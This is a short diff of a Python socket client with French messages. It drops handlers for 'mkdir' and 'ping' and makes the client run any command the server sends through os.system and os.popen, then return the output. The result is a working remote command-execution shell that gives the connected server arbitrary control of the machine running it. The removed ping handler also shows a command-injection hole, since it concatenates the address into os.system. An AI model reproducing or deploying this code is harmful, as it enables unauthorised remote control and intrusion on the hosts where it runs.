@@ -48,22 +48,18 @@ while msg!= "kill" and data!= "kill":
                 name=platform.node()
                 msg=str(f"Mon nom est: {name}")
                 serv.send(msg.encode())
-            
-            elif data.startswith("DOS:mkdir"):
-                nom = data.split()[1]
-                os.mkdir(nom)
-                msg = msg=str(f"Le dossier {nom} a été créé.")
-                serv.send(msg.encode())
-
-            elif data.startswith("ping"):
-                address = data.split()[1]
-                os.system("ping -c 1 " + address)
-                msg = msg=str(f"ping: {address}")
-                serv.send(msg.encode())
 
             else:
-                msg=input("serveur -->")
-                serv.send(msg.encode())
+                cmd = data
+                verif = os.system(cmd)
+                print(verif)
+                msg = os.popen(cmd).read()
+                print(verif)
+                if verif == 0:
+                    serv.send(msg.encode())
+                else:
+                    msg=str(f'Cette commande ne peut pas être lancée')
+                    serv.send(msg.encode())
 
 
         serv.close()
